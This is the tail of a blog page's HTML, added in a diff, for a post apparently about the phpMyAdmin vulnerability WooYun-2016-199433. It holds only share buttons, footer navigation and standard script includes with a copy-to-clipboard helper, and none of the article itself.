+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&text=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&is_video=false&description=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpMyAdmin-WooYun-2016-199433&body=Check out this article: https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&title=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&name=phpMyAdmin-WooYun-2016-199433&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/&t=phpMyAdmin-WooYun-2016-199433"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
